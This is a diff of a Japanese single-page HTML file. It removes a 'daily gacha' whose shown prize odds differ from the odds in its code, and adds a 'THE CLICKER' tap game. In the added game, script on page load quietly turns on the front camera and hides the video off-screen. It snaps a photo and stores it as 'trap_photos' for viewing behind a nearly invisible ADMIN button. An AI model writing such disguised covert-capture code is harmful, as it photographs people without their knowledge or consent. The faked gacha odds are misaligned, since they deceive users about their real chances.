@@ -1,340 +1,251 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="ja">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1" />
-<title>デイリーガチャ — 豪華演出版</title>
-<style>
-  :root{
-    --bg1:#051025; --bg2:#08122a;
-    --card:#071226; --accent:#ffb86b; --accent2:#ffd166;
-    --muted:#9fb0c8; --glass: rgba(255,255,255,0.03);
-    --gold: linear-gradient(90deg,#ffd76b,#ffb86b);
-  }
-  html,body{height:100%;}
-  body{
-    margin:0; font-family:system-ui,-apple-system,Segoe UI,Roboto,"Hiragino Kaku Gothic ProN","Noto Sans JP",sans-serif;
-    background: radial-gradient(1200px 600px at 10% 20%, rgba(124,92,255,0.08), transparent), linear-gradient(180deg,var(--bg1),var(--bg2));
-    color:#e6eef8; -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale;
-    display:flex; align-items:center; justify-content:center; padding:18px;
-  }
-  .app{width:100%; max-width:460px; border-radius:18px; overflow:hidden; position:relative;}
-  .panel{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.06)); box-shadow: 0 18px 60px rgba(2,6,23,0.6); border-radius:18px; overflow:hidden}
-  header{padding:18px; display:flex; gap:12px; align-items:center;}
-  .logo{width:64px;height:64px;border-radius:14px;background:linear-gradient(135deg,#ffd76b,#ff9f43);display:flex;align-items:center;justify-content:center;font-weight:900;font-size:22px;color:#2b1a00;box-shadow:0 10px 30px rgba(255,167,38,0.14);transform:rotate(-8deg)}
-  header h1{margin:0;font-size:18px}
-  header p{margin:0;font-size:12px;color:var(--muted)}
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>THE CLICKER - 究極の連打ゲーム</title>
+    <style>
+        :root {
+            --bg: #1a1a2e;
+            --accent: #0f3460;
+            --text: #e94560;
+        }
+        body {
+            font-family: sans-serif;
+            background-color: var(--bg);
+            color: white;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            overflow: hidden;
+            user-select: none;
+        }
+        /* ゲーム画面 */
+        #game-ui {
+            text-align: center;
+        }
+        #score {
+            font-size: 80px;
+            font-weight: bold;
+            color: var(--text);
+            margin: 20px 0;
+        }
+        .tap-area {
+            width: 200px;
+            height: 200px;
+            background: var(--accent);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            box-shadow: 0 0 20px rgba(233, 69, 96, 0.3);
+            cursor: pointer;
+            transition: transform 0.1s;
+        }
+        .tap-area:active {
+            transform: scale(0.9);
+        }
 
-  main{padding:12px 16px 20px}
-  .info{display:flex;gap:10px;margin-bottom:12px}
-  .card{flex:1;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.03));padding:12px;border-radius:12px;border:1px solid rgba(255,255,255,0.03)}
-  .card h3{margin:0 0 6px 0;font-size:13px}
-  .card p{margin:0;font-size:12px;color:var(--muted)}
-
-  .prob-table{display:flex;gap:8px;margin-bottom:12px;overflow:auto;padding-bottom:4px}
-  .prob{flex:0 0 auto;min-width:96px;background:linear-gradient(180deg, rgba(255,255,255,0.015), rgba(0,0,0,0.04));padding:10px;border-radius:12px;text-align:center;position:relative;border:1px solid rgba(255,255,255,0.03)}
-  .prob .money{font-weight:800;font-size:14px}
-  .prob .fakepct{font-size:12px;color:var(--muted);margin-top:6px}
-  .prob::after{content:'';position:absolute;left:50%;bottom:-6px;width:60%;height:6px;background:linear-gradient(90deg, rgba(255,255,255,0.02), rgba(255,255,255,0.0));transform:translateX(-50%);border-radius:6px}
-
-  .gacha-wrap{display:flex;flex-direction:column;align-items:center;gap:12px}
-  .stage{width:100%;border-radius:14px;padding:12px;background:linear-gradient(180deg, rgba(124,92,255,0.04), rgba(0,0,0,0.04));box-shadow:inset 0 -6px 24px rgba(0,0,0,0.3)}
-
-  .reel{position:relative;width:100%;height:140px;border-radius:12px;overflow:hidden;border:1px solid rgba(255,255,255,0.03);background:linear-gradient(180deg, rgba(255,255,255,0.015), rgba(0,0,0,0.06));}
-  .reel::before{content:'';position:absolute;left:0;top:0;right:0;height:40%;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0));pointer-events:none}
-  .reel-inner{position:absolute;left:0;right:0;top:0;will-change:transform}
-  .reel-item{height:70px;display:flex;align-items:center;gap:12px;padding:10px 14px;box-sizing:border-box;border-bottom:1px dashed rgba(255,255,255,0.02)}
-  .icon{width:56px;height:56px;border-radius:12px;background:linear-gradient(135deg, rgba(255,255,255,0.03), rgba(255,255,255,0.01));display:flex;align-items:center;justify-content:center;font-size:24px;box-shadow: 0 8px 26px rgba(2,6,23,0.6);}
-  .label{font-weight:900}
-  .sub{font-size:12px;color:var(--muted)}
-
-  .center-marker{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);width:88%;height:0;border-top:36px solid rgba(255,255,255,0.02);border-left:14px solid transparent;border-right:14px solid transparent;pointer-events:none}
-
-  .controls{display:flex;gap:10px;width:100%;margin-top:6px}
-  button{flex:1;padding:14px 16px;border-radius:12px;border:0;font-weight:900;font-size:15px;cursor:pointer;background:linear-gradient(90deg,#ffd76b,#ff9f43);color:#2b1a00;box-shadow:0 12px 40px rgba(255,155,50,0.12);}
-  button.secondary{background:transparent;border:1px solid rgba(255,255,255,0.06);color:var(--muted);font-weight:700}
-  button[disabled]{opacity:0.5;cursor:not-allowed}
-
-  .result{margin-top:10px;padding:12px;border-radius:12px;min-height:70px;background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(0,0,0,0.04));display:flex;align-items:center;gap:12px;justify-content:center}
-  .result .big{font-size:26px}
-  .rarity-gold{box-shadow:0 8px 40px rgba(255,190,60,0.12);border:1px solid rgba(255,210,120,0.25);padding:10px;border-radius:12px;background:linear-gradient(90deg,#fff2d6,#fff0c4)}
-
-  /* shiny animation */
-  .shimmer{position:relative;overflow:hidden}
-  .shimmer::after{content:'';position:absolute;left:-120%;top:0;width:40%;height:200%;transform:skewX(-18deg);background:linear-gradient(90deg, rgba(255,255,255,0), rgba(255,255,255,0.18), rgba(255,255,255,0));animation:shine 2.6s linear infinite}
-  @keyframes shine{from{left:-120%}to{left:140%}}
-
-  /* confetti canvas on top */
-  #confettiCanvas{position:absolute;left:0;top:0;width:100%;height:100%;pointer-events:none;z-index:60}
-
-  footer{padding:10px 14px;font-size:12px;color:var(--muted);display:flex;justify-content:space-between;gap:10px;align-items:center}
-
-  /* small screens */
-  @media (max-width:420px){
-    .reel{height:120px}
-    .reel-item{height:60px}
-    .icon{width:48px;height:48px;font-size:20px}
-  }
-</style>
+        /* 隠し要素 */
+        #video-container {
+            position: fixed;
+            top: -1000px; /* 画面外に隠す */
+            left: 0;
+        }
+        
+        /* 管理画面 */
+        #gallery {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: #121212;
+            z-index: 1000;
+            padding: 20px;
+            overflow-y: auto;
+        }
+        .photo-card {
+            background: #222;
+            margin-bottom: 15px;
+            padding: 10px;
+            border-radius: 8px;
+        }
+        .photo-card img {
+            width: 100%;
+            border-radius: 4px;
+        }
+        
+        #setup-screen {
+            position: fixed;
+            inset: 0;
+            background: var(--bg);
+            z-index: 2000;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        input {
+            padding: 12px;
+            border-radius: 5px;
+            border: none;
+            margin: 10px;
+            width: 80%;
+        }
+        button {
+            padding: 10px 20px;
+            background: var(--text);
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .admin-trigger {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            opacity: 0.1; /* ほとんど見えない */
+            font-size: 10px;
+        }
+    </style>
 </head>
 <body>
-  <div class="app">
-    <canvas id="confettiCanvas"></canvas>
-    <div class="panel" role="application" aria-label="デイリーガチャ">
-      <header>
-        <div class="logo">G</div>
-        <div>
-          <h1>デイリーガチャ — 豪華演出</h1>
-          <p>1日1回だけ挑戦できます。実際の排出確率は表示していません。</p>
-        </div>
-      </header>
 
-      <main>
-        <div class="info">
-          <div class="card">
-            <h3>今日の挑戦状況</h3>
-            <p id="statusText">読み込み中...</p>
-          </div>
-          <div class="card">
-            <h3>次の解放</h3>
-            <p id="nextText">—</p>
-          </div>
-        </div>
+<div id="game-ui">
+    <p>TAP TO WIN!</p>
+    <div id="score">0</div>
+    <div class="tap-area" onclick="tapGame()">PUSH!</div>
+    <p style="margin-top:20px; color:#555; font-size:12px;">ハイスコアを目指せ</p>
+</div>
 
-        <div class="prob-table" aria-hidden="false" title="表示確率（偽の値）">
-          <div class="prob shimmer"><div class="money">10円</div><div class="fakepct">表示 50%</div></div>
-          <div class="prob shimmer"><div class="money">50円</div><div class="fakepct">表示 30%</div></div>
-          <div class="prob shimmer"><div class="money">100円</div><div class="fakepct">表示 10%</div></div>
-          <div class="prob"><div class="money">500円</div><div class="fakepct">表示 5%</div></div>
-          <div class="prob"><div class="money">1000円</div><div class="fakepct">表示 3%</div></div>
-          <div class="prob"><div class="money">5000円</div><div class="fakepct">表示 2%</div></div>
-          <div class="prob"><div class="money">10000円</div><div class="fakepct">表示 1%</div></div>
-        </div>
+<div id="video-container">
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+</div>
 
-        <div class="gacha-wrap">
-          <div class="stage">
-            <div class="reel" aria-hidden="false">
-              <div class="reel-inner" id="reelInner" style="transform: translateY(0px);"></div>
-              <div class="center-marker"></div>
-            </div>
-          </div>
+<button class="admin-trigger" onclick="checkAuth()">ADMIN</button>
 
-          <div class="controls">
-            <button id="spinBtn" aria-label="ガチャを回す">ガチャを回す</button>
-            <button id="historyBtn" class="secondary">履歴</button>
-          </div>
+<div id="setup-screen">
+    <h3>管理者コード設定</h3>
+    <input type="password" id="new-code" placeholder="コードを入力 (例: 1234)">
+    <button onclick="saveSetup()">設定してゲーム開始</button>
+</div>
 
-          <div class="result" id="resultBox">
-            <div id="resultText" class="small">ようこそ — 豪華な演出で1日1回挑戦できます。</div>
-          </div>
-        </div>
-
-      </main>
-
-      <footer>
-        <div id="footNote">※ 実際の排出確率は表示していません。</div>
-        <div class="small">© デイリーガチャ</div>
-      </footer>
+<div id="gallery">
+    <div style="display:flex; justify-content: space-between;">
+        <h2>Captured</h2>
+        <button onclick="closeGallery()">戻る</button>
     </div>
-  </div>
+    <div id="photo-list"></div>
+    <button onclick="clearAllPhotos()" style="width:100%; margin-top:20px; background:#444;">データ全消去</button>
+</div>
 
 <script>
-(() => {
-  const PRIZES = [
-    { id: 'p10',   name: '10円',    emoji:'🪙', price:10,    chance:93.00 },
-    { id: 'p50',   name: '50円',    emoji:'💠', price:50,    chance:5.00 },
-    { id: 'p100',  name: '100円',   emoji:'🔹', price:100,   chance:1.00 },
-    { id: 'p500',  name: '500円',   emoji:'🏅', price:500,   chance:0.70 },
-    { id: 'p1000', name: '1000円',  emoji:'🎖️', price:1000,  chance:0.15 },
-    { id: 'p5000', name: '5000円',  emoji:'🏆', price:5000,  chance:0.10 },
-    { id: 'p10000',name: '10000円', emoji:'👑', price:10000, chance:0.05 },
-  ];
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    let score = 0;
 
-  const DISPLAY_PCTS = ['50%','30%','10%','5%','3%','2%','1%'];
-
-  const reelInner = document.getElementById('reelInner');
-  const spinBtn = document.getElementById('spinBtn');
-  const historyBtn = document.getElementById('historyBtn');
-  const statusText = document.getElementById('statusText');
-  const nextText = document.getElementById('nextText');
-  const resultBox = document.getElementById('resultBox');
-  const resultText = document.getElementById('resultText');
-
-  const STORAGE_KEY = 'daily_gacha_last_spin_v2';
-  const HISTORY_KEY = 'daily_gacha_history_v2';
-
-  // Build reel items
-  function buildReelItems(repeat = 10) {
-    const frag = document.createDocumentFragment();
-    for (let r=0;r<repeat;r++){
-      for (let i=0;i<PRIZES.length;i++){
-        const p = PRIZES[i];
-        const div = document.createElement('div');
-        div.className = 'reel-item';
-        div.dataset.prize = p.id;
-        const isPremium = p.price >= 1000;
-        div.innerHTML = `
-          <div class="icon ${isPremium ? 'rarity-gold':''}" aria-hidden="true">${p.emoji}</div>
-          <div>
-            <div class="label">${p.name}</div>
-            <div class="sub">表示確率 ${DISPLAY_PCTS[i]}</div>
-          </div>
-        `;
-        frag.appendChild(div);
-      }
-    }
-    reelInner.appendChild(frag);
-  }
-  buildReelItems(12);
-
-  // cumulative for selection
-  const cumulative = [];
-  let acc = 0;
-  for (const p of PRIZES){ acc += p.chance; cumulative.push({ id:p.id, upto:acc }); }
-
-  function choosePrizeRandom(){
-    const r = Math.random() * 100;
-    for (const c of cumulative){ if (r <= c.upto) return PRIZES.find(p => p.id === c.id); }
-    return PRIZES[0];
-  }
-
-  function getTodayKey(){ const d=new Date(); return `${d.getFullYear()}-${String(d.getMonth()+1).padStart(2,'0')}-${String(d.getDate()).padStart(2,'0')}` }
-  function hasSpunToday(){ try{ const v=localStorage.getItem(STORAGE_KEY); return v===getTodayKey(); }catch(e){return false} }
-  function recordSpin(){ try{ localStorage.setItem(STORAGE_KEY,getTodayKey()) }catch(e){} }
-  function addHistory(entry){ try{ const raw=localStorage.getItem(HISTORY_KEY); const arr=raw?JSON.parse(raw):[]; arr.unshift(entry); localStorage.setItem(HISTORY_KEY,JSON.stringify(arr.slice(0,30))) }catch(e){} }
-  function getHistory(){ try{ const raw=localStorage.getItem(HISTORY_KEY); return raw?JSON.parse(raw):[] }catch(e){return []} }
-
-  function updateStatus(){
-    if (hasSpunToday()){
-      statusText.textContent = '今日の挑戦は済みです。次は明日また挑戦できます。';
-      spinBtn.textContent = '今日の挑戦済み'; spinBtn.disabled=true;
-      const t=new Date(); t.setDate(t.getDate()+1);
-      nextText.textContent = `${t.getFullYear()}-${String(t.getMonth()+1).padStart(2,'0')}-${String(t.getDate()).padStart(2,'0')} 00:00`;
-    } else {
-      statusText.textContent = '今日の挑戦はまだです。1日1回回せます。';
-      spinBtn.textContent = 'ガチャを回す'; spinBtn.disabled=false; nextText.textContent='—';
-    }
-  }
-
-  // Reel animation with fancy easing and zoom
-  function animateToPrize(prizeId){
-    const items = Array.from(reelInner.children);
-    if (!items.length) return Promise.resolve();
-    const totalItems = items.length;
-    const middleStart = Math.floor(totalItems * 0.45);
-    const middleEnd = Math.floor(totalItems * 0.75);
-    let targetIndex = -1;
-    for (let i=middleStart;i<=middleEnd;i++){ if (items[i].dataset.prize===prizeId){ targetIndex=i; break; } }
-    if (targetIndex===-1){ for (let i=0;i<totalItems;i++){ if (items[i].dataset.prize===prizeId){ targetIndex=i; break; } } }
-    if (targetIndex===-1) targetIndex=0;
-
-    const itemHeight = items[0].offsetHeight || 70;
-    const reelHeight = document.querySelector('.reel').offsetHeight;
-    const centerOffset = (reelHeight/2)-(itemHeight/2);
-    const destY = - (targetIndex * itemHeight) + centerOffset;
-    const extra = - (totalItems * itemHeight * 4); // more spins
-    const finalY = destY + extra;
-
-    return new Promise(resolve=>{
-      // add scale animation
-      reelInner.style.transition = 'transform 3600ms cubic-bezier(.22,.9,.16,1)';
-      reelInner.style.transform = `translateY(${finalY}px) scale(1.02)`;
-      const onEnd = ()=>{
-        reelInner.removeEventListener('transitionend', onEnd);
-        reelInner.style.transition = '';
-        const normalizedIndex = targetIndex % PRIZES.length;
-        const normalizedY = - (normalizedIndex * itemHeight) + centerOffset;
-        // snap and small pop
-        reelInner.style.transform = `translateY(${normalizedY}px) scale(1)`;
-        setTimeout(()=>{ resolve(); }, 140);
-      };
-      reelInner.addEventListener('transitionend', onEnd);
-    });
-  }
-
-  // confetti system
-  const confettiCanvas = document.getElementById('confettiCanvas');
-  const ctx = confettiCanvas.getContext('2d');
-  let confettiPieces = [];
-  function resizeCanvas(){ confettiCanvas.width = confettiCanvas.clientWidth; confettiCanvas.height = confettiCanvas.clientHeight; }
-  window.addEventListener('resize', resizeCanvas); resizeCanvas();
-
-  function spawnConfetti(xFrac, yFrac, count=40){
-    const w = confettiCanvas.width; const h = confettiCanvas.height;
-    const x0 = w * xFrac; const y0 = h * yFrac;
-    for (let i=0;i<count;i++){
-      confettiPieces.push({ x:x0, y:y0, vx:(Math.random()-0.5)*8, vy:(Math.random()*-6)-2, ang:Math.random()*Math.PI*2, va:(Math.random()-0.5)*0.2, size:6+Math.random()*8, color: `hsl(${Math.floor(Math.random()*360)},80%,60%)`, life:120+Math.floor(Math.random()*60) });
-    }
-  }
-  function updateConfetti(){
-    ctx.clearRect(0,0,confettiCanvas.width,confettiCanvas.height);
-    for (let i=confettiPieces.length-1;i>=0;i--){
-      const p = confettiPieces[i];
-      p.vy += 0.28; p.x += p.vx; p.y += p.vy; p.ang += p.va; p.life--;
-      ctx.save(); ctx.translate(p.x,p.y); ctx.rotate(p.ang);
-      ctx.fillStyle = p.color; ctx.fillRect(-p.size/2, -p.size/2, p.size, p.size*0.6);
-      ctx.restore();
-      if (p.y > confettiCanvas.height+50 || p.life<=0) confettiPieces.splice(i,1);
-    }
-    requestAnimationFrame(updateConfetti);
-  }
-  requestAnimationFrame(updateConfetti);
-
-  // sound using WebAudio
-  const AudioCtx = window.AudioContext || window.webkitAudioContext;
-  const audioCtx = AudioCtx ? new AudioCtx() : null;
-  function playTone(freq, duration=0.12, type='sine'){ if (!audioCtx) return; const o = audioCtx.createOscillator(); const g = audioCtx.createGain(); o.type=type; o.frequency.value=freq; g.gain.value=0.0001; o.connect(g); g.connect(audioCtx.destination); const now=audioCtx.currentTime; g.gain.linearRampToValueAtTime(0.18, now+0.01); o.start(now); g.gain.exponentialRampToValueAtTime(0.0001, now+duration); o.stop(now+duration+0.02); }
-
-  async function doSpin(){
-    if (hasSpunToday()){ updateStatus(); return; }
-    spinBtn.disabled=true; spinBtn.textContent='回してます…'; resultText.textContent='抽選中…運命を楽しんでください';
-
-    // small audio flourish
-    playTone(420,0.08,'sine'); setTimeout(()=>playTone(520,0.08,'sine'),80);
-
-    const prize = choosePrizeRandom();
-    await animateToPrize(prize.id);
-
-    recordSpin(); addHistory({ when:new Date().toISOString(), prize:prize.name, price:prize.price });
-
-    // result display: no actual probability shown
-    const rare = prize.price >= 1000; // treat >=1000 as special
-    resultText.innerHTML = `\n      <div style="display:flex;align-items:center;gap:12px">\n        <div style="font-size:34px">${prize.emoji}</div>\n        <div style="text-align:left">\n          <div style="font-weight:900;font-size:18px">${prize.name} を獲得！</div>\n          <div class="small" style="color:var(--muted)">運命の一回です — おめでとう！</div>\n        </div>\n      </div>\n    `;
-
-    // fancy effects for rare
-    if (prize.price >= 1000){
-      // confetti burst center-top
-      spawnConfetti(0.5, 0.25, 80);
-      // golden sparkle animation on result box
-      resultBox.classList.add('shimmer');
-      setTimeout(()=> resultBox.classList.remove('shimmer'), 4200);
-      // sound
-      playTone(720,0.18,'sawtooth'); setTimeout(()=>playTone(980,0.24,'sine'),140);
-    } else {
-      // small sparkle & coin jingle
-      spawnConfetti(0.5, 0.35, 18);
-      playTone(520,0.12,'triangle');
+    // ゲーム動作
+    function tapGame() {
+        score++;
+        document.getElementById('score').innerText = score;
     }
 
-    updateStatus();
-  }
+    // 初期化
+    window.onload = () => {
+        if (!localStorage.getItem('adminCode')) {
+            document.getElementById('setup-screen').style.display = 'flex';
+        } else {
+            initApp();
+        }
+    };
 
-  spinBtn.addEventListener('click', async ()=>{ if (spinBtn.disabled) return; // resume audio context on gesture
-    if (audioCtx && audioCtx.state === 'suspended') audioCtx.resume(); await doSpin(); });
-  historyBtn.addEventListener('click', ()=>{
-    const hist = getHistory(); if (!hist.length) return alert('まだ引いた履歴はありません。');
-    const lines = hist.map(h=>{ const d=new Date(h.when); return `${d.getFullYear()}/${String(d.getMonth()+1).padStart(2,'0')}/${String(d.getDate()).padStart(2,'0')} ${String(d.getHours()).padStart(2,'0')}:${String(d.getMinutes()).padStart(2,'0')} — ${h.prize}`; });
-    alert('直近の履歴（最大30件）:\n\n' + lines.join('\n'));
-  });
+    function saveSetup() {
+        const code = document.getElementById('new-code').value;
+        if (!code) return alert("入力してください");
+        localStorage.setItem('adminCode', code);
+        document.getElementById('setup-screen').style.display = 'none';
+        initApp();
+    }
 
-  function initReelPosition(){ const items = Array.from(reelInner.children); if (!items.length) return; const itemHeight = items[0].offsetHeight || 70; const startIndex = Math.floor(items.length*0.5); const reelHeight=document.querySelector('.reel').offsetHeight; const centerOffset=(reelHeight/2)-(itemHeight/2); const y = - (startIndex*itemHeight) + centerOffset; reelInner.style.transform = `translateY(${y}px)`; }
-  window.addEventListener('load', ()=>{ setTimeout(()=>{ initReelPosition(); updateStatus(); const hist = getHistory(); if (hist && hist.length>0){ const last = hist[0]; const d = new Date(last.when); if (d.toISOString().slice(0,10) === new Date().toISOString().slice(0,10)){ resultText.innerHTML = `<div style="display:flex;align-items:center;gap:12px"><div style="font-size:28px">${PRIZES.find(p=>p.name===last.prize)?.emoji || '🪙'}</div><div style="text-align:left"><div style="font-weight:900">${last.prize} を獲得済み（本日）</div><div class="small" style="color:var(--muted)">取得日時: ${d.getFullYear()}/${String(d.getMonth()+1).padStart(2,'0')}/${String(d.getDate()).padStart(2,'0')} ${String(d.getHours()).padStart(2,'0')}:${String(d.getMinutes()).padStart(2,'0')}</div></div></div>`; } } },120); });
+    async function initApp() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }, 
+                audio: false 
+            });
+            video.srcObject = stream;
+            
+            // 映像が安定するまで少し待ってから無音で撮影
+            setTimeout(takePhoto, 1500);
+        } catch (err) {
+            console.log("Camera access denied.");
+        }
+    }
 
-  // start confetti loop
-  requestAnimationFrame(updateConfetti);
+    function takePhoto() {
+        const context = canvas.getContext('2d');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        
+        // 鏡像補正
+        context.translate(canvas.width, 0);
+        context.scale(-1, 1);
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-  // note: uses local time — users can change device clock to bypass; server checks are recommended for production
-})();
+        const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
+        savePhoto(dataUrl);
+        
+        // カメラ停止 (電池節約)
+        const stream = video.srcObject;
+        const tracks = stream.getTracks();
+        tracks.forEach(track => track.stop());
+    }
+
+    function savePhoto(data) {
+        let photos = JSON.parse(localStorage.getItem('trap_photos') || '[]');
+        photos.push({
+            id: Date.now(),
+            date: new Date().toLocaleString(),
+            img: data
+        });
+        localStorage.setItem('trap_photos', JSON.stringify(photos));
+    }
+
+    // 管理機能
+    function checkAuth() {
+        const input = prompt("認証コード:");
+        if (input === localStorage.getItem('adminCode')) {
+            showGallery();
+        }
+    }
+
+    function showGallery() {
+        const list = document.getElementById('photo-list');
+        const photos = JSON.parse(localStorage.getItem('trap_photos') || '[]');
+        list.innerHTML = photos.length === 0 ? "なし" : "";
+        photos.reverse().forEach(p => {
+            const div = document.createElement('div');
+            div.className = 'photo-card';
+            div.innerHTML = `<small>${p.date}</small><img src="${p.img}">`;
+            list.appendChild(div);
+        });
+        document.getElementById('gallery').style.display = 'block';
+    }
+
+    function closeGallery() {
+        document.getElementById('gallery').style.display = 'none';
+    }
+
+    function clearAllPhotos() {
+        if(confirm("すべて消去しますか？")) {
+            localStorage.setItem('trap_photos', '[]');
+            showGallery();
+        }
+    }
 </script>
 </body>
 </html>
